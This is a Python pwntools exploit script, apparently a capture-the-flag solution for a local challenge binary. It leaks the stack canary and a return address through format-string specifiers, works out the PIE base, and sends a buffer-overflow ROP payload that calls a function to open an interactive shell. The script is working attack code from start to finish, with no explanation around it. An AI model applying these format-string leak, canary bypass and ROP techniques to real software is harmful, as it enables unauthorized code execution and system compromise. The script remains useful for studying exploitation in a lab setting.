#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys 
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or sys.argv[1])
rop = ROP(exe)
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())



io = start()

#================= Leak Canary ==================================
io.sendline(b"PRINTS")
io.sendline(b"%43$p")
io.sendline(b"EXEC")
canary = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"Canary: {hex(canary)}")

#================= Leak PIE Base ==================================
io.sendline(b"PRINTS")
io.sendline(b"%45$p")
io.sendline(b"EXEC")
call_site = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
live_exec_instruction = call_site - 236 
base_addr = live_exec_instruction - exe.sym['exec_instructions']
exe.address = base_addr
print(f"Base: {hex(base_addr)}")

#================= ROP Configuration ==================================
pwn_func4 = exe.symbols['pwn_func4']
print(f"pwn_func4: {hex(pwn_func4)}")
POP_RDI = rop.rdi.address
print(f"POP_RDI: {hex(POP_RDI)}")
RET = rop.ret.address

#================= Payload Construction ==================================
payload = b"".join([
    b"prints ",
    b'A' * (272-8),
    p64(canary),
    b"\0" * 8,
    p64(rop.rdi.address + base_addr),
    b"/bin/sh\x00",
    p64(pwn_func4)
])

io.sendlineafter(b'Enter command: ', payload)
io.sendlineafter(b'Enter command: ', b'exec\n')
io.interactive()
io.close()
